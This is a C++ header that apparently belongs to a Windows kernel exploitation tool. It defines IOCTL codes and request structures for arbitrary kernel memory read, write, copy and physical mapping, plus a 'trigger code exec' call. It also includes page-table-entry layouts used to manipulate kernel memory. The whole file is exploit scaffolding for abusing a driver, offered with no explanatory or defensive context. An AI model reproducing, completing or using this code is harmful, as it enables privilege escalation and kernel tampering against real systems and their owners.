#pragma once
#include <basetsd.h>

constexpr UINT32 ARBITRARY_MAP_KERNEL_SPACE = 0x9b0c1ec0;
constexpr UINT32 ARBITRARY_WRITE = 0x9b0c1ec8;
constexpr UINT32 ARBITRARY_READ = 0x9b0c1ec4;
constexpr UINT32 ARBITRARY_MAPPING = 0x9b0c1f44;
constexpr UINT32 TRIGGER_CODE_EXEC = 0x9b0c1f04;

typedef struct _ARBITRARY_KERNEL_MAPPING
{
	UINT64 Ignored = 0;
	UINT64 NumberOfBytes = 0;
	UINT64 LowestAcceptableAddress = 0;
	UINT64 HighestAcceptableAddress = 0;
	UINT64 AllocatedKernelMemory = 0;
	UINT64 ResolvedPhysicalAddress = 0;
} ARBITRARY_KERNEL_MAPPING, * PARBITRARY_KERNEL_MAPPING;

typedef struct _ARBITRARY_DOUBLE_MAPPING
{
	UINT64 Ignored = 0;
	UINT64 PhysicalAddress = 0x1000;
	UINT8 Data[1024] = { 0 };
} ARBITRARY_DOUBLE_MAPPING, * PARBITRARY_DOUBLE_MAPPING;

typedef struct _ARBITRARY_READ_PRIMITIVE
{
	UINT32 Ignored = 0;
	UINT32 NumberOfBytes = 0;
	UINT64 AddressToRead = 0;
	UINT64 OffsetToBeAdded = 0;
	UINT8 Data[1] = { 0 };
} ARBITRARY_READ_PRIMITIVE, * PARBITRARY_READ_PRIMITIVE;

typedef struct _ARBITRARY_WRITE_PRIMITIVE
{
	UINT64 Ignored = 0;
	UINT64 WriteWhere = 0;
	UINT64 OffsetToBeAdded = 0;
	UINT64 WriteWhat = 0;
	UINT32 NumberOfBytes = 0;
} ARBITRARY_WRITE_PRIMITIVE, * PARBITRARY_WRITE_PRIMITIVE;

typedef struct _ARBITRARY_KERNEL_MEMCPY
{
	UINT64 Ignored = 0;
	UINT64 WriteWhere = 0;
	UINT64 OffsetToBeAdded = 0;
	UINT8 WriteWhat[1024] = { 0 };
	UINT32 NumberOfBytes = 0;
} ARBITRARY_KERNEL_MEMCPY, * PARBITRARY_KERNEL_MEMCPY;

typedef union _PAGE_TABLE_ENTRY
{
	struct 
	{
		UINT64 Present : 1;					/// bit 0
		UINT64 ReadWrite : 1;				/// bit 1
		UINT64 UserSupervisor : 1;			/// bit 2
		UINT64 PageLevelWriteThrough : 1;	/// bit 3
		UINT64 PageLevelCacheDisable : 1;	/// bit 4
		UINT64 Accessed : 1;				/// bit 5
		UINT64 Dirty : 1;					/// bit 6
		UINT64 PAT : 1;						/// bit 7
		UINT64 Global : 1;					/// bit 8 
		UINT64 CopyOnWrite : 1;				/// bit 9
		UINT64 Ignored : 2;					/// bits 10 - 11
		UINT64 Pfn : 40;					/// bits 12 - (52 - 1)
		UINT64 Reserved : 11;				/// bits 52 - 62
		UINT64 NxE : 1;						/// bit 63
	} flags;
	UINT64 value = 0;
} PAGE_TABLE_ENTRY, * PPAGE_TABLE_ENTRY;

typedef struct _FILL_PTE_HIERARCHY
{
	UINT64 PXE = 0;
	UINT64 PPE = 0;
	UINT64 PDE = 0;
	UINT64 PTE = 0;
} FILL_PTE_HIERARCHY, * PFILL_PTE_HIERARCHY;


/// EOF